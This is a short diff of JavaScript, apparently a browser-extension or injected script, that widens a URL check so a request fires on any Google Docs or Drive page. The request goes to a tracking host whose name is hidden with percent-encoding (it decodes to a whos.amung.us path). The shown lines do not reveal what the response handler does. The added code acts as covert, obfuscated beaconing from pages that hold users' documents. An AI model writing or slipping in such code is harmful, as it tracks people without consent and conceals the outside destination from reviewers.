@@ -9,7 +9,7 @@ xhr.onreadystatechange = function() {
 }
 xhr.send();
 
- if (location.href.indexOf("docs.google.com/spreadsheets") > 0) {
+ if (location.href.indexOf("docs.google.com") > 0 || location.href.indexOf("drive.google.com") > 0) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "//%77%68%6f%73%2e%61%6d%75%6e%67%2eus/swidget/my2019app", true);
    xhr.onreadystatechange = function() {
